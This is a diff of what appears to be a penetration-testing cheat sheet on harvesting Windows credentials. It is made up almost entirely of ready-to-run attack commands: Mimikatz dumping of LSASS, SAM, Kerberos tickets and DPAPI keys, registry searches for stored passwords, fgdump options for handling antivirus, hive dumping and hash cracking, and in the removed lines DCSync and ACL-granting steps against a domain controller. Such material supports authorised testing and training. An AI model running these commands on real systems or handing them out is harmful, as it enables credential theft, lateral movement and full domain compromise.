@@ -1,47 +1,39 @@
-# Credentials and Tickets
+# Local Credentials
 
-## Enumerate Users And Hashes
+## Readable Passwords
 
-```
-privilege::debug
-token::elevate
+### Unattend.xml files
 
-sekurlsa::logonpasswords 
-sekurlsa::ekeys /aes128
-sekurlsa::ekeys /aes256
-
-vault::cred
-vault::list
-```
-
-## NTLM From Password
+Passwords are stored in Base64
 
 ```
-python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
 ```
 
-## ShadowCopy Exploit
-
-It is possible to retrieve and dump keys from old backup versions of the system saved with ShadowCopy. Once the backup version is exposed you can dump the SAM credentials and extract  DPAPI hashes
-
-Enumerate copies
+### Passwords in System Registry
 
 ```
-vssadmin list shadows
-diskshadow list shadows all
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
 ```
 
-Create a link to the copy
+## Manual hash dump - All windows versions
 
-```
-mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\<shadow copy volume name>\
-```
-
-## SAM credentials dump
-
-### Dumping
-
-#### Manual
+### Key retrieval
 
 Administrative privileges are required to dump register keys
 
@@ -62,25 +54,7 @@ Possible backups location
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
 
-#### fgdump.exe
-
-Runs locally, creates a file with the hashes.
-
-```
-fgdump.exe
-fgdump.exe -t    #test for anti-virus presence
-fgdump.exe -a    #don't try to disable anti-virus
-fgdump.exe -r    #ignore existing dump files
-```
-
-#### Mimikatz
-
-```
-lsadump::sam                 //SAM database
-lsadump::secrets             //SAM secrets
-```
-
-### Decryption
+### Local decryption
 
 Impacket - secretsdump.py
 
@@ -95,14 +69,44 @@ samdump2 system.save sam.save
 pwdump SYSTEM SAM > <file>
 ```
 
-After obtaining the hashes they can be cracked to obtain the passwords or used in Pass the Hash attacks.
+After obtaining the hashes crack them using `john -format=NT` or Pass The Hash
+
+## fgdump.exe - Windows 2000,XP
+
+Runs locally, creates a file with the hashes.
 
 ```
-john -format=NT -wordlist=<wordlist> <hashfile>
-hashcat -m 1000 -a 0 --force --show --username <hash> <wordlist> #rows follow the format <user>:<hash>
+fgdump.exe
+fgdump.exe -t    #test for anti-virus presence
+fgdump.exe -a    #don't try to disable anti-virus
+fgdump.exe -r    #ignore existing dump files
 ```
 
-## DPAPI hash dump
+## Mimikatz - Windows Vista,7,8,10
+
+Elevate as NT AUTHORITY / SYSTEM
+
+```
+privilege::debug
+token::whoami
+token::elevate
+```
+
+### Harvest keys and tickets
+
+```
+sekurlsa::logonpasswords     //dump LSASS
+sekurlsa::minidump <path>    //dump LSASS as file
+
+kerberos::list /dump         //Kerberos credentials
+sekurlsa::tickets            //Kerberos tickets in memory
+sekurlsa::ekeys              //Kerberos AES key
+
+lsadump::sam                 //SAM database
+lsadump::secrets             //SAM secrets
+```
+
+### Harvest credentials
 
 Usual credential files position
 
@@ -112,44 +116,22 @@ Usual credential files position
 %appdata%\Microsoft\Protect\<usersid>\    //master key
 ```
 
-Enumerate Credentials hashes. The parameter `guidMasterKey` reveals the hash of the master key
+Decrypt Credentials hashes
 
 ```
-dpapi::cred /in:"<path to cred hash>" 
+dpapi::cred /in:"<path to cred hash>"            //get info on hash
+dpapi::masterkey /in:"<path to master key>"      //get the master key
+dpapi::masterkey /in:"<path to master key>" /rpc //decode the master key by passing it to the DC
+dpapi::cache                                     //load the master key in cache
+dpapi::cred /in:"<path to cred hash>"            //decrypt credentials using the master key
 ```
 
-Retrieve the master key, decode it and store the key in cache. In order to decrypt the key we need to be operating under the same context (user, system) the key belongs to.&#x20;
+### Harvest certificates and auth keys
 
 ```
-dpapi::masterkey /in:"<Path to MasterKeyGUID>" 
-dpapi::masterkey /in:"<Path to MasterKeyGUID>" /rpc
-dpapi::cache
-```
-
-Decrypt other hashes with the master key
-
-```
-dpapi::cred /in:"<path to CredHash>"
-```
-
-## DC KRBTGT hash dump
-
-Use a DCSync attack to dump the hash used by the domain controller to sign Kerberos tickets. This allows an attacker to create custom tickets and impersonate other users or gain access to different services/hosts. To execute this attack we need to operate under a user with the `Replicating Directory Changes All` and `Replicating Directory Changes` privileges. By default Local and Domain Administrators own these privileges.
-
-Find users with the required privileges with PowerView
-
-```
-Get-ObjectACL -DistinguishedName "dc=<domain>,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
-```
-
-If the current user lacks the required permissions run this command on the DC to add them.
-
-```
-Add-ObjectAcl -TargetDistinguishedName "dc=<domain>,dc=local" -PrincipalSamAccountName <user> -Rights DCSync -Verbose
-```
-
-Run mimikatz on the DC
-
-```
-lsadump::dcsync /user:<user> /krbtgt
+crypto::listProviders
+crypto::listKeys
+crypto::listCertificates
+crypto::exportCertificates
+crypto::exportKeys
 ```
